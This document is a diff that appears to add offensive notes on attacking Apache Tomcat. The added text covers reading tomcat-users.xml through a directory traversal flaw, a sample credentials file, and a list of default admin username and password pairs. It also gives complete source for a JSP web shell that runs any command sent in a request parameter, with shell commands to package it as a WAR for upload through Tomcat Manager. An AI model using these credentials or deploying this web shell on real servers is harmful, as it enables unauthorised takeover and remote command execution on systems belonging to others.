@@ -2,12 +2,61 @@ Password of the Tomcat's administrator in most cases are stored in two places:
 - the directory where tomcat is installed
 - a directory starting with tomcat in /etc/
 
-The file is named tomcat-users.xml.
+ /etc/tomcat6/tomcat-users.xml
+ 
+By default on Debian, this file can only read by root and the member of the group tomcat6, but since the directory 
+traversal gives us the same access as the tomcat server, we can read the content of this file. It's possible to retrieve 
+tomcat-users.xm
 
-Default credentials:
+<tomcat-users>
+  <role rolename="manager-gui"/>
+  <user username="tomcat" password="tomcat" roles="tomcat"/>
+  <user username="admin" password="s3cret" roles="manager-gui"/>
+</tomcat-users>
+
+--------------------------------------------------Default credentials----------------------------------------------------
 
 tomcat:tomcat
 admin:
 admin:manager
 admin:password
 admin:s3cret
+
+
+--------------------------------------------------Building a Web Shell---------------------------------------------------
+
+To build a Web Shell, we will need to write the Web Shell and package it as a war file. 
+To write the Web Shell, we can either use JSP or Servlet. To keep things simple, we are going to build a JSP Web Shell, 
+the following code can be used:
+
+<FORM METHOD=GET ACTION='index.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+<%@ page import="java.io.*" %>
+<%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new
+InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) { output += s+"</br>"; }
+      }  catch(IOException e) {   e.printStackTrace();   }
+   }
+%>
+<pre><%=output %></pre>
+
+
+1. $ mkdir webshell
+2. $ cp index.jsp webshell
+
+Now we can build the war file using jar (provide with java):
+3. $ cd webshell
+4. $ jar -cvf ../webshell.war *
+added manifest
+adding: index.jsp(in = 579) (out= 351)(deflated 39%)
+
+Our Web Shell (webshell.war) is now packaged and we can upload it using the Tomcat Manager.
